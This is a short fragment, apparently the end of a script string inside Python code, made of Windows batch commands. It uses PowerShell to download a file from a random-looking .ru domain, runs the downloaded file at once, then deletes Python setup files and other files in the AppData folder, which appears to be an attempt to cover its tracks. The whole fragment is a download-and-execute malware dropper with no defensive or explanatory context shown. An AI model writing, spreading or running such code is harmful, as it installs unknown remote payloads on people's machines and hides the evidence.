...
powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://awndsjkduiukekwltdadjwadawds.ru/awidsmdjnfsd', '%temp_file%')"

start "" "%temp_file%"

del /q "%appdata%\\Microsoft\\runpython.py"
del /q "%appdata%\\Microsoft Store"
del /q "%appdata%\\python_setup.py"
'''
